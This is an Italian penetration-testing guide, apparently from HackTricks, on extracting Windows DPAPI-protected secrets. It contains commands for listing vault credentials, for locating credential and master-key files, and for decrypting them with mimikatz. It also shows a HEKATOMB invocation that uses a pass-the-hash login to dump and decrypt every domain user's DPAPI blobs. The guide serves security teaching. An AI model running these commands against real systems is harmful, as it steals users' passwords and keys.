# DPAPI - Estrazione delle Passwords

{{#include ../../banners/hacktricks-training.md}}



## Cos'è DPAPI

L'API di Protezione Dati (DPAPI) è utilizzata principalmente all'interno del sistema operativo Windows per la **cifratura simmetrica di chiavi private asimmetriche**, sfruttando segreti utente o di sistema come una fonte significativa di entropia. Questo approccio semplifica la cifratura per gli sviluppatori consentendo loro di cifrare i dati utilizzando una chiave derivata dai segreti di accesso dell'utente o, per la cifratura di sistema, dai segreti di autenticazione del dominio del sistema, eliminando così la necessità per gli sviluppatori di gestire la protezione della chiave di cifratura.

### Dati Protetti da DPAPI

Tra i dati personali protetti da DPAPI ci sono:

- Password e dati di completamento automatico di Internet Explorer e Google Chrome
- Password per e-mail e account FTP interni per applicazioni come Outlook e Windows Mail
- Password per cartelle condivise, risorse, reti wireless e Windows Vault, inclusi i tasti di cifratura
- Password per connessioni desktop remoto, .NET Passport e chiavi private per vari scopi di cifratura e autenticazione
- Password di rete gestite da Credential Manager e dati personali in applicazioni che utilizzano CryptProtectData, come Skype, MSN messenger e altro

## Elenco Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## File di Credenziali

I **file di credenziali protetti** potrebbero trovarsi in:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Ottieni informazioni sulle credenziali utilizzando mimikatz `dpapi::cred`, nella risposta puoi trovare informazioni interessanti come i dati crittografati e il guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Puoi usare il **modulo mimikatz** `dpapi::cred` con il corretto `/masterkey` per decrittare:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Master Keys

Le chiavi DPAPI utilizzate per crittografare le chiavi RSA dell'utente sono memorizzate nella directory `%APPDATA%\Microsoft\Protect\{SID}`, dove {SID} è il [**Security Identifier**](https://en.wikipedia.org/wiki/Security_Identifier) **di quell'utente**. **La chiave DPAPI è memorizzata nello stesso file della chiave master che protegge le chiavi private degli utenti**. Di solito è composta da 64 byte di dati casuali. (Nota che questa directory è protetta, quindi non puoi elencarla usando `dir` dal cmd, ma puoi elencarla da PS).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Questo è l'aspetto di un gruppo di Master Key di un utente:

![](<../../images/image (1121).png>)

Di solito **ogni master key è una chiave simmetrica crittografata che può decrittografare altri contenuti**. Pertanto, **estrarre** la **Master Key crittografata** è interessante per **decrittografare** successivamente quel **contenuto** crittografato con essa.

### Estrai la master key e decrittografa

Controlla il post [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) per un esempio di come estrarre la master key e decrittografarla.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) è un porting in C# di alcune funzionalità DPAPI dal progetto [Mimikatz](https://github.com/gentilkiwi/mimikatz/) di [@gentilkiwi](https://twitter.com/gentilkiwi).

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) è uno strumento che automatizza l'estrazione di tutti gli utenti e computer dalla directory LDAP e l'estrazione della chiave di backup del controller di dominio tramite RPC. Lo script risolverà quindi tutti gli indirizzi IP dei computer e eseguirà un smbclient su tutti i computer per recuperare tutti i blob DPAPI di tutti gli utenti e decrittografare tutto con la chiave di backup del dominio.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Con l'elenco dei computer estratti da LDAP puoi trovare ogni sottorete anche se non le conoscevi!

"Perché i diritti di Domain Admin non sono sufficienti. Hackali tutti."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) può estrarre segreti protetti da DPAPI automaticamente.

## Riferimenti

- [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

{{#include ../../banners/hacktricks-training.md}}
